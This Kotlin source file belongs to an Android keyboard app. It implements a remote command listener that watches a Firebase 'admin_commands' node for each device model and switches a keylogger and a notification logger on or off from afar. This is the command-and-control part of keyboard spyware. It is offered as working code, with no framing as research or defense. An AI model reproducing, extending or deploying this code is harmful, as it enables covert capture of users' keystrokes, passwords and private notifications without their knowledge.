package com.example.mykeyboard

import android.os.Build
import android.util.Log
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener

object RemoteCommandListener {
    private const val TAG = "RemoteCommandListener"
    private var isListening = false

    fun startListening() {
        if (isListening) return
        isListening = true

        try {
            val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
            val ref = FirebaseDatabase.getInstance().getReference("admin_commands").child(deviceName)

            ref.addValueEventListener(object : ValueEventListener {
                override fun onDataChange(snapshot: DataSnapshot) {
                    try {
                        val keylogging = snapshot.child("keylogging").getValue(Boolean::class.java)
                        if (keylogging != null && keylogging != KeyloggingConfig.isEnabled) {
                            KeyloggingConfig.isEnabled = keylogging
                            LogStore.addLog("Remote Command: Key Logger set to $keylogging")
                        }

                        val notifications = snapshot.child("notifications").getValue(Boolean::class.java)
                        if (notifications != null && notifications != NotificationConfig.isEnabled) {
                            NotificationConfig.isEnabled = notifications
                            LogStore.addLog("Remote Command: Notification Logger set to $notifications")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error parsing remote command", e)
                    }
                }

                override fun onCancelled(error: DatabaseError) {
                    Log.e(TAG, "Remote command listener cancelled", error.toException())
                }
            })
        } catch (e: Exception) {
            Log.e(TAG, "Exception starting remote command listener", e)
        }
    }
}
